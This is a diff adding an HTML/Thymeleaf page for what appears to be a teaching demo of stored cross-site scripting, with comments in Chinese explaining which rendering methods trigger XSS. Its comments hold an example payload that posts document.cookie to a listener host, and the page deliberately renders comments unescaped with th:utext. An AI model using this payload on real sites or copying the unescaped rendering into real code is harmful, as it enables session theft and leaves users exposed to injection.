@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Hello</title>
+
+    <script src="/js/jquery-3.6.0.min.js"></script>
+</head>
+<body>
+<div>hello, 评论-存储型XSS示例</div>
+
+<div id="request_div" style="margin-top: 30px;">
+    <form id="submitForm" action="/xss/saveXSS">
+        <!-- 攻击脚本输入示例如下，其中示例1仅仅是页面效果，示例2会实际发送数据给攻击者 -->
+        <!-- 示例1： <script>alert('it is a xss test!')</script> -->
+        <!-- 示例2： <script>$.ajax({url:"http://localhost:8081/listener/log",type:"POST",dataType:"json",data:JSON.stringify({data:document.cookie}),processData:false,contentType:"application/json",success:function(arg){console.log(arg);console.log("监听到数据");}});</script>-->
+        <table>
+            <tr>
+                <td>评论：</td>
+                <td><input name="content" type="text" /></td>
+            </tr>
+        </table>
+    </form>
+
+    <button onclick="xssRequest()">保存，刷新当前页面</button>
+</div>
+
+<!-- 评论列表 -->
+<div id="response_div" style="margin-top: 30px;">
+    <span>返回结果</span>
+
+    <table>
+        <tr th:each="comment : ${commentList}">
+            <!-- text不会触发页面渲染，不会触发XSS -->
+            <!--<td th:text="${comment.content}"></td>-->
+
+            <!-- 支持html渲染，会触发XSS -->
+            <td th:utext="${comment.content}"></td>
+
+        </tr>
+    </table>
+</div>
+</body>
+
+<script>
+
+    // form序列化为json
+    $.fn.serializeObject = function()
+    {
+        var o = {};
+        var a = this.serializeArray();
+        $.each(a, function() {
+            if (o[this.name] !== undefined) {
+                if (!o[this.name].push) {
+                    o[this.name] = [o[this.name]];
+                }
+                o[this.name].push(this.value || '');
+            } else {
+                o[this.name] = this.value || '';
+            }
+        });
+        return o;
+    };
+
+    $(function (){
+
+    });
+
+
+    function ajaxDo(url) {
+        var formdata = $("#submitForm").serializeObject();
+        $.ajax({
+            url: url,
+            type: 'POST',
+            dataType: "json",
+            data: JSON.stringify(formdata),
+            processData: false, // tell jQuery not to process the data
+            // contentType: false, // tell jQuery not to set contentType
+            contentType: 'application/json', // tell jQuery not to set contentType
+            success:function (user) {
+
+                console.log(user);
+
+                console.log(user.username);
+
+                // 塞值类方法不会有xss（不触发页面重新渲染）
+                //$("#showMsg").val(user.username);
+
+                // ajax渲染类方法会有xss（脚本更改页面dom的方法，如果返回值不处理，都能触发XSS，此处的html和append，都能触发）
+                $("#xssSpan").html("");
+                $("#xssSpan").html(user.username)
+                // $("#xssSpan").append(user.username)
+            }
+        });
+    }
+
+    function xssRequest() {
+        $('#submitForm').submit();
+    }
+</script>
+</html>
